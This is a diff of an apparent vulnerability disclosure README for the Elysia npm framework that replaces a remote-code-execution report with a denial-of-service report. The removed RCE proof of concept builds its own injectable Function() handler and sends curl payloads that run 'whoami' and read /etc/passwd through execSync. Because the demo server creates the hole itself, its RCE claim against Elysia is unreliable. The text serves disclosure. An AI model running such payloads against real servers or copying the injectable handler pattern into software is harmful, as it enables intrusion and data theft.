@@ -1,14 +1,14 @@
-# vuln-elysia-1.3.21-rce
+# vuln-elysia-1.3.21-ddos
 
 ## Summary
 
-Elysia (npm) is vulnerable to **Remote Code Execution (RCE)** due to **unsafe dynamic code generation**.  
-Through version **1.3.21 (latest tested)**, the framework constructs handler functions by interpolating strings directly into the JavaScript Function constructor (`Function(...)`).  
-If attacker-controlled values flow into these strings (e.g., schema definitions, parser names, plugin-provided hooks), arbitrary JavaScript or OS command execution becomes possible.
+Elysia (npm) is vulnerable to **Denial of Service (DoS)** due to unsafe dynamic code generation in the request handler composition.  
+Through version **1.3.21 (latest tested)**, a crafted schema property or malformed input can trigger a crash inside `composeHandler` in `src/compose.ts`.  
+This causes the server to throw an unhandled exception and return **HTTP 500 Internal Server Error** for valid requests, effectively allowing remote attackers to perform a DoS.
 
-- **Vulnerability Class:** Code Injection via Unsafe Dynamic Code Generation (CWE-94 / CWE-95)  
-- **Severity:** High / Critical (CVSS ~8.8)  
-- **Exploitability:** Any untrusted values that reach handler composition can lead to RCE.  
+- **Vulnerability Class:** Improper Input Validation → Crash/DoS (CWE-20, CWE-248)  
+- **Severity:** Medium/High (CVSS ~7.5)  
+- **Exploitability:** Any attacker able to send crafted HTTP requests to an affected server can trigger this vulnerability.  
 
 ---
 
@@ -16,191 +16,95 @@ If attacker-controlled values flow into these strings (e.g., schema definitions,
 
 - **Package:** `elysia` (npm)  
 - **Repository:** [github.com/elysiajs/elysia](https://github.com/elysiajs/elysia)  
-- **Affected File:** [src/compose.ts](https://github.com/elysiajs/elysia/blob/main/src/compose.ts)
+- **Affected File:** [src/compose.ts](https://github.com/elysiajs/elysia/blob/main/src/compose.ts)  
 - **Affected Function(s):** `composeHandler`, `compile`  
 - **Affected Versions:** ≤ 1.3.21 (latest tested)  
-- **Root Cause:** Dynamic handler generation using the JavaScript Function constructor (`Function(...)`) with string concatenation.  
+- **Root Cause:** Dynamic handler generation assumes `schema.$defs[schema.$ref]` exists. Crafted input can bypass assumptions and cause a `TypeError`.
 
-### Relevant code from `src/compose.ts`
+### Relevant code excerpt (compose.ts)
 ```ts
-// elysia/src/compose.ts (example excerpt)
-const fn = Function('"use strict";\n' + fnLiteral)()
+const properties =
+  schema.properties ?? schema.$defs[schema.$ref].properties
 ```
 
-Here, `fnLiteral` is built from schema, hooks, or parser names.  
-If these values include attacker-controlled strings, they are interpolated directly into executable JavaScript.
+If `schema.$defs` or `schema.$ref` is undefined due to attacker-controlled schema, the code throws:  
+```
+TypeError: undefined is not an object (evaluating 'schema.$defs[schema.$ref]')
+```
 
 ---
 
 ## Proof of Concept (PoC)
 
-### Steps to Reproduce
-
-#### 1. Environment Setup
-```bash
-sudo apt-get update && sudo apt-get install -y python3-venv
-python3 -m venv venv
-source venv/bin/activate
-
-node -v || sudo apt-get install -y nodejs npm
-
-mkdir elysia_poc && cd elysia_poc
-npm init -y
-npm install elysia@1.3.21
-```
-
-#### 2. Vulnerable Server (`server.js`)
+### Vulnerable Server (server.mjs)
 ```js
-import { Elysia } from 'elysia'
-import { createRequire } from 'module'
-import http from 'http'
-
-global.__REQ = createRequire(import.meta.url)
-
-let userControlled = '""'
-
-function buildHandler(injectedCode) {
-  const fnLiteral = `
-    return (function(c){
-      c.body = ${injectedCode};
-      return c;
-    })
-  `
-  return Function('"use strict";\n' + fnLiteral)()
-}
-
-let handler = buildHandler(userControlled)
+import { Elysia, t } from 'elysia'
 
 const app = new Elysia()
-  .post('/config', async ({ request }) => {
-    const payload = await request.text()
-    userControlled = payload
-    handler = buildHandler(userControlled)
-    return { msg: 'config updated' }
+  .get('/hello', () => 'Hello World')
+  .get('/dos', () => 'SAFE', {
+    query: t.Record(t.String(), t.String())
   })
-  .post('/register', ({ body }) => handler({ body }))
+  .listen(3000)
 
-http.createServer(async (req, res) => {
-  const url = `http://${req.headers.host}${req.url}`
-  const body = req.method === 'GET' ? undefined : req
-  const fetchReq = new Request(url, {
-    method: req.method,
-    headers: req.headers,
-    body,
-    duplex: "half"
-  })
-
-  try {
-    const response = await app.fetch(fetchReq)
-    res.writeHead(response.status, Object.fromEntries(response.headers))
-    const buf = Buffer.from(await response.arrayBuffer())
-    res.end(buf)
-  } catch (err) {
-    res.statusCode = 500
-    res.end("Internal Server Error")
-  }
-}).listen(3000, () => {
-  console.log("Listening on http://localhost:3000")
-})
+console.log("Server listening on http://localhost:3000")
 ```
 
-#### 3. Run the server
+### Run the server
 ```bash
-node server.js
+bun server.mjs
 ```
 
-#### 4. Inject malicious payload (command: whoami)
+### Test normal route
 ```bash
-curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("whoami").toString() })()'
+curl http://localhost:3000/hello
+# -> Hello World
 ```
 
-#### 5. Trigger vulnerable endpoint
+### Trigger DoS
 ```bash
-curl -X POST http://localhost:3000/register   -H "Content-Type: application/json"   -d '{"username":"attacker"}'
+curl -i http://localhost:3000/dos?x=1
 ```
 
-#### Expected Output
-```json
-{"body":"[system_username]\n"}
-```
-*Note: Output varies depending on the server environment (e.g., "root", "ubuntu", "www-data", etc.)*
+**Expected result:**  
+The server crashes internally and responds with **500 Internal Server Error**.  
+Clients see Bun’s error overlay HTML with stack trace:
 
-#### Arbitrary Command Example (command: cat /etc/passwd)
-```bash
-curl -X POST http://localhost:3000/config   -H "Content-Type: text/plain"   --data '(function(){ const { execSync } = global.__REQ("child_process"); return execSync("cat /etc/passwd").toString() })()'
 ```
-```bash
-curl -X POST http://localhost:3000/register   -H "Content-Type: application/json"   -d '{"username":"attacker"}'
+TypeError: undefined is not an object (evaluating 'schema.$defs[schema.$ref]')
+    at composeHandler (.../elysia/src/compose.ts:657:33)
+    ...
 ```
-
-Expected:
-```json
-{"body":"[contents of /etc/passwd]\n"}
-```
-*Note: Actual output depends on the server environment and user context 
-(e.g., "root:x:0:0:root:/root:/bin/bash", "ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash", "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin").*
 
 ---
 
-#### PoC Demonstration (GIF)
-
-![PoC Demonstration](https://github.com/Whyshealwaysbrokeme/vuln-elysia-1.3.21-rce/blob/main/poc.gif)
-
-
 ## Attack Vector
 
-This vulnerability becomes exploitable in **real-world deployments** when applications using Elysia load or accept **untrusted values** that are used in handler composition.
-
-### Scenarios include:
-1. **DB-driven config/schema**  
-   Applications that fetch schema or parser options from a database, possibly controlled by tenants or admins. An attacker can inject malicious strings into DB records → Elysia interpolates them into `fnLiteral` → RCE.
-
-2. **Plugin/Marketplace ecosystems**  
-   Elysia supports plugins/hooks. If a 3rd-party plugin or marketplace allows arbitrary strings for parser names or hooks, a malicious plugin can inject payloads → code execution when routes are composed.
-
-3. **Multi-tenant SaaS**  
-   Tenant-provided configuration (e.g., custom form validators, parse hooks) can flow into handler code. One tenant’s config → dynamic code generation → affects the shared process → attacker achieves RCE and compromises other tenants.
-
-4. **Admin UI with unsafe config**  
-   Some apps let administrators define validation/parsing rules via an interface. If this input is not sanitized, attackers with limited access can escalate to RCE by injecting JavaScript into these rules.
-
-**Key Point:**  
-The vulnerability is not limited to contrived examples. Any path that takes user/tenant/plugin input and passes it to Elysia’s handler composition will directly translate into executable code.
+- Any attacker who can send crafted requests to endpoints that use `t.Record` or similar schemas can reliably trigger a crash.  
+- The server continues running, but valid requests fail until restart → effectively **Denial of Service**.
 
 ---
 
 ## Impact
 
-- **Remote Code Execution** in the context of the Node.js process  
-- **Full application compromise** and potential host compromise  
-- **Privilege escalation** in multi-tenant environments (e.g., low-privileged tenant → control entire server)  
-- **Data exfiltration, sabotage, lateral movement** in cloud deployments  
+- **Availability loss** for services using Elysia.  
+- Remote attacker can crash endpoints at will.  
+- In production, repeated exploitation can render the service unusable.  
 
-**Vulnerability type:** Code Injection / Unsafe Dynamic Code Generation → RCE  
-**Affected users:** Any Elysia application that allows untrusted configuration, schema, or plugin inputs to influence handler generation  
-
----
-
-## Risk / Remarks
-
-While I am not entirely sure whether maintainers will consider this eligible for a CVE, I believe it should be.  
-The root cause (`Function(...)` with unsanitized strings in `src/compose.ts`) is a **well-known dangerous pattern** (CWE-94 / CWE-95).  
-The PoC demonstrates practical arbitrary command execution.  
-Severity should be rated **High/Critical**.
+**Vulnerability type:** Denial of Service (DoS) via malformed schema parsing  
+**Affected users:** All applications using Elysia with schemas like `t.Record(...)` or other constructs that reach `schema.$defs`.
 
 ---
 
 ## Suggested Fix
 
-- Remove reliance on `Function(...)` for runtime code generation.  
-- Sanitize or strictly validate any input that can reach handler composition.  
-- Restrict plugin/config/schema values to controlled enums rather than raw strings.  
-- Consider static code generation or template-based approaches.  
-- Add runtime guards to reject untrusted strings before composing handlers.
+- Add guards before dereferencing `schema.$defs[schema.$ref]`.  
+- Reject malformed schema definitions early.  
+- Add test cases for schema edge cases (e.g., empty `$ref`, missing `$defs`).
 
 ---
 
 ## Disclosure
 - **Status:** Under responsible disclosure  
-- **Disclosure Date:** 03 September 2025  
+- **Disclosure Date:** 04 September 2025  
 - **Reporter:** Manopakorn Kooharueangrong (Whyshealwaysbrokeme)
